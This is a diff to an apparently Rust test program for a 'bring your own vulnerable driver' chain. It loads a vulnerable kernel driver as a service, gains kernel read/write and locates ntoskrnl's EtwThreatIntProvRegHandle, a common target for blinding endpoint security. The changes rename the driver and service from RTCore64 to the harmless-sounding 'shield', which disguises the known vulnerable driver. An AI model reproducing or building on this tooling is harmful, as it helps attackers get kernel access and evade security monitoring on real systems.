@@ -1,7 +1,7 @@
 //! 任务 H：BYOVD bootstrap 真机测试（管理员运行）。
 //!
 //! 链路：
-//!   bootstrap_byovd("RTCore64.sys") → LoadedDriver + ByovdDriver(KernelRw)
+//!   bootstrap_byovd("shield.sys") → LoadedDriver + ByovdDriver(KernelRw)
 //!   → kernel_base::ntoskrnl_base()
 //!   → KernelRw 读 ntoskrnl PE → resolve_kernel_symbol("EtwThreatIntProvRegHandle") → RVA
 //!   → 打印 base / RVA / KVA
@@ -69,12 +69,12 @@ fn enable_privileges() {
 }
 
 /// UTF-16 NUL-terminated driver path, **relative to SystemRoot**
-/// (`System32\drivers\RTCore64.sys`). This matches what `sc create binPath=`
+/// (`System32\drivers\shield.sys`). This matches what `sc create binPath=`
 /// writes and is the most broadly accepted ImagePath form: the IO manager
 /// resolves it against `%SystemRoot%`. An absolute `\??\C:\...` path is
 /// rejected on some builds (Server 2019 17763 → STATUS_INVALID_IMAGE_FORMAT
 /// 0xC0000160). The driver file is also copied to
-/// `C:\Windows\System32\drivers\RTCore64.sys`.
+/// `C:\Windows\System32\drivers\shield.sys`.
 #[cfg(target_os = "windows")]
 const SYS_PATH: &[u16] = &[
     'S' as u16,
@@ -94,24 +94,22 @@ const SYS_PATH: &[u16] = &[
     'r' as u16,
     's' as u16,
     '\\' as u16,
-    'R' as u16,
-    'T' as u16,
-    'C' as u16,
-    'o' as u16,
-    'r' as u16,
+    's' as u16,
+    'h' as u16,
+    'i' as u16,
     'e' as u16,
-    '6' as u16,
-    '4' as u16,
+    'l' as u16,
+    'd' as u16,
     '.' as u16,
     's' as u16,
     'y' as u16,
     's' as u16,
     0,
 ];
-/// 服务名 `RTCore64`（不含 NUL —— bootstrap 会补）。
+/// 服务名 `shield`（不含 NUL —— bootstrap 会补）。
 #[cfg(target_os = "windows")]
 const SVC_NAME: &[u16] = &[
-    'R' as u16, 'T' as u16, 'C' as u16, 'o' as u16, 'r' as u16, 'e' as u16, '6' as u16, '4' as u16,
+    's' as u16, 'h' as u16, 'i' as u16, 'e' as u16, 'l' as u16, 'd' as u16,
 ];
 
 /// 读取 ntoskrnl 镜像的字节数。17763 ntoskrnl ~9MB；读 10MB 留余量。
@@ -145,7 +143,7 @@ fn main() {
     enable_privileges();
 
     // ---- 1. bootstrap BYOVD：加载驱动 + 打开设备 ----
-    println!("[H.1] bootstrap_byovd(RTCore64) ...");
+    println!("[H.1] bootstrap_byovd(Shield) ...");
     let (mut loaded, krw) = unsafe {
         match bootstrap_byovd(SYS_PATH, SVC_NAME) {
             Ok(t) => t,
